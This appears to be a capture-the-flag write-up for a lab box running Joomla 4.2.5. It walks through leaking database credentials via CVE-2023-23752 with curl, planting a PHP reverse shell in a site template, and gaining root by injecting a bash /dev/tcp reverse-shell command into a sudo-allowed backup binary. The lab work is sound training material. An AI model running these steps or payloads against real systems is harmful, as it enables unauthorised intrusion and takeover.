---

Name: Samurai
Difficulty: Easy
URL: https://www.hacksmarter.org/events/7f9dc321-77ce-49b8-8acc-5c224ef25d8d/take/samurai-easy
Description: As part of a penetration test, your team identified an interesting web server. Your task is to enumerate the target, establish an initial foothold, and escalate privileges to root.

---

# What is the user flag?

```bash
80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Samurai
|_http-favicon: Unknown favicon MD5: 3E18B73692FF5A74F54EFFB2E047C8CB
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


Found README.txt, looks like it is using joomla
```bash
Joomla! CMSâ„¢

1- Overview
	* This is a Joomla! 4.x installation/upgrade package.
	* Joomla! Official site: https://www.joomla.org
	* Joomla! 4.2 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_4.2_version_history
	* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/4.2-dev

```

Let's find the version

```bash

msf > use auxiliary/scanner/http/joomla_version
msf auxiliary(scanner/http/joomla_version) > options

Module options (auxiliary/scanner/http/joomla_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported
                                         proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploi
                                         t/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the Joomla application
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf auxiliary(scanner/http/joomla_version) > set RHOSTS 10.1.107.212
RHOSTS => 10.1.107.212
msf auxiliary(scanner/http/joomla_version) > run
[*] Server: Apache/2.4.52 (Ubuntu)
[+] Joomla version: 4.2.5
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/joomla_version) >

```

Or we could have gone here, http://10.1.107.212/administrator/manifests/files/joomla.xml
```xml
<version>4.2.5</version>
```

The API endpoint is vulnerable to **CVE-2023-23752**, an information disclosure vulnerability affecting Joomla 4.2.5

Requesting the application configuration leaks the database credentials:

```bash
curl http://10.1.107.212/api/index.php/v1/config/application?public=true
```

```text
DB User:     joomla425
DB Password: Pa847word987@Joomla456
```

Another API endpoint discloses the Joomla Super User account:

```bash
curl http://10.1.107.212/api/index.php/v1/users?public=true
```

```text
Username: Miyamoto
```

In this challenge, the leaked database password is reused as the administrator password, allowing us to authenticate to the Joomla administration panel as **Miyamoto**

We start a listener
```bash
nc -lvnp 4444
```

After replacacing index.php with a [php revshell](https://www.revshells.com/)  (System → Site Templates), we visit /templates/cassiopeia/index.php and get a connection

![joomla](../../../../../public/images/hack_smarter/DEFCON_CTF/linux_hacking/samurai/joomla.png) 
<!--TODO explain better-->

```bash

www-data@streetcoder:/home$ find / -name user.txt 2> /dev/null
find / -name user.txt 2> /dev/null
/var/www/user.txt

```

# What is the root flag?
```bash
www-data@streetcoder:/home$ sudo -l
sudo -l
Matching Defaults entries for www-data on streetcoder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on streetcoder:
    (root) NOPASSWD: /opt/backup/DbMaria
```

```bash
www-data@streetcoder:/opt/backup$ ls -l
ls -l
total 16
-rwsr-xr-x 1 root root 16128 Mar  6 09:38 DbMaria
```

```bash
www-data@streetcoder:/opt/backup$ find / -perm -4000 2> /dev/null
find / -perm -4000 2> /dev/null
/opt/backup/DbMaria
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/libexec/polkit-agent-helper-1
/usr/bin/pkexec
/usr/bin/mount
/usr/bin/umount
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/fusermount3
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/snap/core20/2318/usr/bin/chfn
/snap/core20/2318/usr/bin/chsh
/snap/core20/2318/usr/bin/gpasswd
/snap/core20/2318/usr/bin/mount
/snap/core20/2318/usr/bin/newgrp
/snap/core20/2318/usr/bin/passwd
/snap/core20/2318/usr/bin/su
/snap/core20/2318/usr/bin/sudo
/snap/core20/2318/usr/bin/umount
/snap/core20/2318/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2318/usr/lib/openssh/ssh-keysign
/snap/snapd/21759/usr/lib/snapd/snap-confine
www-data@streetcoder:/opt/backup$
```

```bash
$ strings /opt/backup/DbMaria
mariadb-dump --socket=/run/mysqld/mysqld.sock -u root %s > /tmp/backup.sql
```

The binary seems to be running commands as root using our input, we can trick it into running chaining commands and getting a shell as root

We start another listener
```bash
nc -lvnp 1234
```

```bash
sudo /opt/backup/DbMaria "test; bash -c 'bash -i >& /dev/tcp/10.200.77.254/1234 0>&1'"
```
